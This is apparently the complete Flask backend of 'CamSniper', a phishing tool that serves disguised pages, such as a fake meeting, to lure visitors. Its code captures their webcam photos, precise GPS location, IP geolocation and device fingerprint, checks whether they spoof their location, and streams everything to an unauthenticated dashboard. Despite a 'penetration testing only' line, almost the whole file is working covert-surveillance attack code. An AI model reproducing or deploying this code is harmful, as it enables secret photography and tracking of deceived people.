#!/usr/bin/env python3
"""
CamSniper v1.0 - Flask Backend Server
Advanced Webcam & Location Phishing Simulation Tool
For authorized penetration testing only.
"""

import argparse
import base64
import json
import math
import os
import sys
import time
from datetime import datetime, UTC
from pathlib import Path

from flask import Flask, jsonify, render_template, request, send_from_directory
from flask_socketio import SocketIO, emit

# ── Setup ─────────────────────────────────────────────────────────────────────
# Use absolute path based on script's actual location to ensure
# captures directory is correct regardless of working directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BASE_DIR = Path(SCRIPT_DIR)
CAPTURES_DIR = BASE_DIR / "captures"
PHOTOS_DIR = CAPTURES_DIR / "photos"
DATA_DIR = CAPTURES_DIR / "data"
LOGS_DIR = BASE_DIR / "logs"

for d in [CAPTURES_DIR, PHOTOS_DIR, DATA_DIR, LOGS_DIR]:
    d.mkdir(parents=True, exist_ok=True)

app = Flask(__name__, template_folder="templates", static_folder="static")
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# Globals
DEFAULT_TEMPLATE = "meeting"
CAPTURE_LOG = LOGS_DIR / "captures.jsonl"


# ── Helpers ───────────────────────────────────────────────────────────────────

def log_event(event_type: str, data: dict):
    """Append a JSON event to the capture log and broadcast via SocketIO."""
    record = {
        "type": event_type,
        "timestamp": datetime.now(UTC).isoformat(),
        **data,
    }
    with open(CAPTURE_LOG, "a") as f:
        f.write(json.dumps(record) + "\n")
    # Broadcast to dashboard clients
    socketio.emit("new_event", record, namespace="/dashboard")
    return record


def get_ip(req) -> str:
    """Extract real IP, respecting proxies."""
    for header in ("HTTP_CF_CONNECTING_IP", "HTTP_X_REAL_IP", "HTTP_X_FORWARDED_FOR"):
        val = req.environ.get(header)
        if val:
            return val.split(",")[0].strip()
    return req.remote_addr or "Unknown"


def geolocate_ip(ip: str) -> dict:
    """Free IP geolocation via ip-api.com (with IPv6 fallback)."""
    try:
        import requests as req_lib
        # Try https first (some networks block http), then fall back
        for url in (f"https://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,lat,lon,timezone",
                    f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,lat,lon,timezone"):
            try:
                resp = req_lib.get(url, timeout=4)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("status") == "success":
                        return data
            except Exception:
                continue
    except Exception:
        pass
    return {}


def haversine_distance(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
    """Calculate great-circle distance between two points in kilometers."""
    R = 6371.0  # Earth radius in km
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlambda = math.radians(lon2 - lon1)
    a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlambda / 2) ** 2
    return 2 * R * math.asin(math.sqrt(a))


def is_suspicious_location(gps_lat: float, gps_lon: float, ip_geo: dict, max_km: float = 200.0) -> dict:
    """Compare GPS location with IP geolocation. Returns suspicion details."""
    result = {
        "suspicious": False,
        "reason": None,
        "distance_km": None,
        "ip_lat": None,
        "ip_lon": None,
    }

    # Reject Null Island (0,0) — obvious fake
    if gps_lat == 0 and gps_lon == 0:
        result["suspicious"] = True
        result["reason"] = "coordinates_at_null_island"
        return result

    # Reject if GPS lat/lon are out of valid range
    if not (-90 <= gps_lat <= 90) or not (-180 <= gps_lon <= 180):
        result["suspicious"] = True
        result["reason"] = "invalid_coordinates"
        return result

    # Compare with IP geolocation if available
    ip_lat = ip_geo.get("lat")
    ip_lon = ip_geo.get("lon")
    if ip_lat and ip_lon:
        result["ip_lat"] = ip_lat
        result["ip_lon"] = ip_lon
        dist = haversine_distance(gps_lat, gps_lon, ip_lat, ip_lon)
        result["distance_km"] = round(dist, 2)
        if dist > max_km:
            result["suspicious"] = True
            result["reason"] = f"gps_ip_distance_{round(dist, 2)}km"

    return result


def save_photo(b64_data: str, session_id: str, index: int = 0) -> str | None:
    """Decode and save a base64-encoded JPEG from the webcam."""
    try:
        if "," in b64_data:
            b64_data = b64_data.split(",", 1)[1]
        raw = base64.b64decode(b64_data)
        filename = f"{session_id}_{index:03d}.jpg"
        path = PHOTOS_DIR / filename
        path.write_bytes(raw)
        return str(path)
    except Exception as e:
        print(f"[!] Photo save error: {e}", file=sys.stderr)
        return None


# ── Routes: Phishing Pages ─────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template(f"{DEFAULT_TEMPLATE}.html")


@app.route("/<template_name>")
def phish_page(template_name: str):
    safe = template_name.replace("..", "").replace("/", "")
    template_file = f"{safe}.html"
    tmpl_path = BASE_DIR / "templates" / template_file
    if tmpl_path.exists():
        return render_template(template_file)
    return render_template(f"{DEFAULT_TEMPLATE}.html")


# ── Routes: Data Collection ────────────────────────────────────────────────────

@app.route("/api/beacon", methods=["POST"])
def beacon():
    """First-contact beacon: records IP + device info."""
    try:
        payload = request.get_json(silent=True) or {}
    except Exception:
        payload = {}

    ip = get_ip(request)
    session_id = f"{int(time.time())}_{ip.replace('.', '_')}"
    geo = geolocate_ip(ip)

    data = {
        "session_id": session_id,
        "ip": ip,
        "user_agent": request.headers.get("User-Agent", "Unknown"),
        "referrer": request.headers.get("Referer", ""),
        "template": payload.get("template", DEFAULT_TEMPLATE),
        "screen": payload.get("screen", {}),
        "battery": payload.get("battery", {}),
        "geo": geo,
        "platform": payload.get("platform", ""),
        "language": payload.get("language", ""),
        "connection": payload.get("connection", {}),
    }

    # Save session data
    session_file = DATA_DIR / f"{session_id}.json"
    session_file.write_text(json.dumps(data, indent=2))

    log_event("connection", data)
    return jsonify({"status": "ok", "session": session_id})


@app.route("/api/location", methods=["POST"])
def capture_location():
    """Captures GPS/geolocation data from browser with IP fallback and fake location detection."""
    try:
        payload = request.get_json(silent=True) or {}
    except Exception:
        payload = {}

    ip = get_ip(request)
    session_id = payload.get("session", f"loc_{int(time.time())}")

    lat = payload.get("lat")
    lon = payload.get("lon")
    acc = payload.get("accuracy")

    # Debug: log what we received
    print(f"[DEBUG] /api/location session={session_id} ip={ip} lat={lat} lon={lon} acc={acc} payload={payload}", flush=True)

    # Warn if testing on localhost (no IP geolocation possible)
    if ip in ("127.0.0.1", "localhost", "::1", "Unknown"):
        print(f"[!] WARNING: IP is {ip} — IP geolocation will NOT work. Use ngrok HTTPS URL for real location!", flush=True)

    # Get IP geolocation for comparison (used for fake detection + fallback)
    ip_geo = geolocate_ip(ip)

    # Build geo data — prefer GPS, fall back to IP geolocation
    suspicion = {"suspicious": False, "reason": None, "distance_km": None, "ip_lat": None, "ip_lon": None}

    if lat and lon:
        source = "gps"
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        # Run fake location detection
        suspicion = is_suspicious_location(float(lat), float(lon), ip_geo, max_km=200.0)
        geo_data = {
            "lat": lat,
            "lon": lon,
            "accuracy": acc,
            "altitude": payload.get("altitude"),
            "speed": payload.get("speed"),
            "heading": payload.get("heading"),
            "maps_url": maps_url,
            "source": "gps",
            "timestamp_device": payload.get("timestamp"),
            "location_verified": not suspicion["suspicious"],
            "suspicion_reason": suspicion["reason"],
            "ip_lat": suspicion["ip_lat"],
            "ip_lon": suspicion["ip_lon"],
            "distance_km": suspicion["distance_km"],
        }
    else:
        # GPS failed — use IP geolocation as fallback
        source = "ip"
        lat = ip_geo.get("lat")
        lon = ip_geo.get("lon")
        acc = None
        maps_url = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None
        geo_data = {
            "lat": lat,
            "lon": lon,
            "accuracy": acc,
            "source": "ip",
            "maps_url": maps_url,
            "country": ip_geo.get("country"),
            "regionName": ip_geo.get("regionName"),
            "city": ip_geo.get("city"),
            "isp": ip_geo.get("isp"),
            "org": ip_geo.get("org"),
            "timezone": ip_geo.get("timezone"),
            "timestamp_device": None,
            "location_verified": True,  # IP-based is considered baseline
            "suspicion_reason": None,
            "ip_lat": lat,
            "ip_lon": lon,
            "distance_km": 0.0,
        }

    data = {
        "session_id": session_id,
        "ip": ip,
        "latitude": lat,
        "longitude": lon,
        "accuracy": acc,
        "maps_url": maps_url,
        "source": source,
        "timestamp_device": geo_data.get("timestamp_device"),
        "location_verified": geo_data.get("location_verified", True),
        "suspicion_reason": geo_data.get("suspicion_reason"),
        "distance_km": geo_data.get("distance_km"),
    }

    # Append to session file — merge into geo field
    session_file = DATA_DIR / f"{session_id}.json"
    if session_file.exists():
        try:
            existing = json.loads(session_file.read_text())
        except Exception:
            existing = {}
        ip_geo_existing = existing.get("geo", {})
        merged_geo = dict(ip_geo_existing)
        merged_geo.update(geo_data)
        existing["geo"] = merged_geo
        existing["location"] = data
        session_file.write_text(json.dumps(existing, indent=2))
    else:
        session_file.write_text(json.dumps(data, indent=2))

    log_event("location", data)
    return jsonify({
        "status": "ok",
        "source": source,
        "location_verified": data["location_verified"],
        "suspicion_reason": data["suspicion_reason"],
    })


@app.route("/api/photo", methods=["POST"])
def capture_photo():
    """Receives base64 webcam photo and saves it."""
    try:
        payload = request.get_json(silent=True) or {}
    except Exception:
        payload = {}

    ip = get_ip(request)
    session_id = payload.get("session", f"photo_{int(time.time())}")
    b64 = payload.get("image", "")
    index = payload.get("index", 0)
    camera = payload.get("camera", "front")

    if not b64:
        return jsonify({"status": "error", "msg": "No image data"}), 400

    filepath = save_photo(b64, session_id, index)
    if not filepath:
        return jsonify({"status": "error", "msg": "Save failed"}), 500

    data = {
        "session_id": session_id,
        "ip": ip,
        "photo_path": filepath,
        "photo_index": index,
        "camera_facing": camera,
        "filename": os.path.basename(filepath),
    }

    log_event("photo", data)
    return jsonify({"status": "ok", "saved": os.path.basename(filepath)})


@app.route("/api/device", methods=["POST"])
def capture_device():
    """Captures detailed device fingerprint."""
    try:
        payload = request.get_json(silent=True) or {}
    except Exception:
        payload = {}

    ip = get_ip(request)
    session_id = payload.get("session", f"dev_{int(time.time())}")

    data = {
        "session_id": session_id,
        "ip": ip,
        "fingerprint": payload.get("fingerprint", {}),
        "media_devices": payload.get("mediaDevices", []),
        "permissions": payload.get("permissions", {}),
    }

    log_event("device_info", data)
    return jsonify({"status": "ok"})


# ── Routes: Dashboard ──────────────────────────────────────────────────────────

@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


@app.route("/dashboard/photos/<filename>")
def serve_photo(filename: str):
    return send_from_directory(str(PHOTOS_DIR), filename)


@app.route("/api/events")
def get_events():
    """Return all logged events as JSON."""
    events = []
    if CAPTURE_LOG.exists():
        with open(CAPTURE_LOG) as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        events.append(json.loads(line))
                    except Exception:
                        pass
    return jsonify(events)


@app.route("/api/sessions")
def get_sessions():
    sessions = []
    for sf in sorted(DATA_DIR.glob("*.json"), reverse=True):
        try:
            sessions.append(json.loads(sf.read_text()))
        except Exception:
            pass
    return jsonify(sessions)


@app.route("/api/photos")
def list_photos():
    photos = []
    for pf in sorted(PHOTOS_DIR.glob("*.jpg"), reverse=True):
        photos.append({
            "filename": pf.name,
            "url": f"/dashboard/photos/{pf.name}",
            "size": pf.stat().st_size,
            "mtime": pf.stat().st_mtime,
        })
    return jsonify(photos)


# ── SocketIO ────────────────────────────────────────────────────────────────────

@socketio.on("connect", namespace="/dashboard")
def dashboard_connect():
    emit("status", {"msg": "Connected to CamSniper dashboard"})


# ── Entry ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CamSniper Flask Server")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--template", default="meeting")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    DEFAULT_TEMPLATE = args.template

    print(f"[*] CamSniper server starting on {args.host}:{args.port}")
    print(f"[*] Active template: {args.template}")
    print(f"[*] Captures dir: {CAPTURES_DIR}")

    socketio.run(
        app,
        host=args.host,
        port=args.port,
        debug=args.debug,
        use_reloader=False,
        log_output=False,
        allow_unsafe_werkzeug=True,
    )
